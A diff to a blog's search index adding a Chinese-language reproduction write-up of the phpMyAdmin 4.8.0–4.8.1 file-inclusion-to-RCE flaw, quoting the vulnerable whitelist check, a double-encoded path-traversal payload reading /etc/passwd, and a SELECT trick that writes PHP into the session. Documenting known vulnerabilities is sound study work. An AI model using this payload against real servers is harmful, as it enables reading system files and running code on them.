@@ -4,6 +4,31 @@
   
     
     <entry>
+      <title>phpmyadmin 4.8.1 rce</title>
+      <link href="/2020/02/08/phpmyadmin%204.8.1%20rce/"/>
+      <url>/2020/02/08/phpmyadmin%204.8.1%20rce/</url>
+      
+        <content type="html"><![CDATA[<h1 id="phpmyadmin-4-8-1-rce"><a href="#phpmyadmin-4-8-1-rce" class="headerlink" title="phpmyadmin 4.8.1 rce"></a>phpmyadmin 4.8.1 rce</h1><h2 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h2><p> phpMyAdmin 4.8.0 and 4.8.1 </p><p>登陆账号</p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>环境:phpstudy 2018,windows 10</p><p>漏洞位置:<code>index.php</code>:57</p><pre><code class="php">if (! empty($_REQUEST[&#39;target&#39;])    &amp;&amp; is_string($_REQUEST[&#39;target&#39;])    &amp;&amp; ! preg_match(&#39;/^index/&#39;, $_REQUEST[&#39;target&#39;])    &amp;&amp; ! in_array($_REQUEST[&#39;target&#39;], $target_blacklist)    &amp;&amp; Core::checkPageValidity($_REQUEST[&#39;target&#39;])) {    include $_REQUEST[&#39;target&#39;];    exit;}</code></pre><p>非常明显的任意文件包含漏洞</p><p>前面几个条件都很好满足,我们看下最后一个<code>Core::checkPageValidity($_REQUEST[&#39;target&#39;])</code></p><p>跟进去</p><pre><code class="php">public static function checkPageValidity(&amp;$page, array $whitelist = [])    {        if (empty($whitelist)) {            $whitelist = self::$goto_whitelist;        }        if (! isset($page) || !is_string($page)) {            return false;        }        if (in_array($page, $whitelist)) {            return true;        }        $_page = mb_substr(            $page,            0,            mb_strpos($page . &#39;?&#39;, &#39;?&#39;)        );        if (in_array($_page, $whitelist)) {            return true;        }        $_page = urldecode($page);        $_page = mb_substr(            $_page,            0,            mb_strpos($_page . &#39;?&#39;, &#39;?&#39;)        );        if (in_array($_page, $whitelist)) {            return true;        }        return false;    }</code></pre><p>要返回<code>true</code>的话,需要<code>$page</code>从开头到第一个<code>?</code>之间的字符串在白名单中,有以下白名单</p><pre><code class="php">array (  0 =&gt; &#39;db_datadict.php&#39;,....)</code></pre><p>因为复现环境是在windows下,windows文件名不能包含<code>?</code>,所以<code>db_datadict.php?</code>会变为<code>db_datadict.php</code>是一个已经存在的文件,我们便无法用<code>../</code>来穿梭目录了,但是我们可以看到<code>$_page = urldecode($page);</code></p><p>所以我们可以构造<code>db_datadict.php%253f</code>来绕过</p><p>通用的payload:</p><p><code>db_datadict.php%253f../../../../../../../../../../../etc/passwd</code></p><p>可以通过<code>SELECT &#39;&lt;?=phpinfo()?&gt;&#39;;</code> 来写shell到我们的session中</p><p><img src="https://i.loli.net/2020/02/08/p4l2vM6JOLsTGCd.png" alt="image1794"></p><p><img src="https://i.loli.net/2020/02/08/wUZHdhJx9KSQRG7.png" alt="image1859"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p><code>db_datadict.php%253f../../../../../../../../../../../etc/passwd</code></p><p>可以通过<code>SELECT &#39;&lt;?=phpinfo()?&gt;&#39;;</code> 来写shell到我们的session中</p><p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： [<a href="https://explorersss.github.io/2020/02/08/phpmyadmin">https://explorersss.github.io/2020/02/08/phpmyadmin</a> 4.8.1 rce/](<a href="https://explorersss.github.io/2020/02/08/phpmyadmin">https://explorersss.github.io/2020/02/08/phpmyadmin</a> 4.8.1 rce/) <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> cve复现 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> cve复现 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>2020hgame</title>
       <link href="/2020/02/07/2020hgame/"/>
       <url>/2020/02/07/2020hgame/</url>
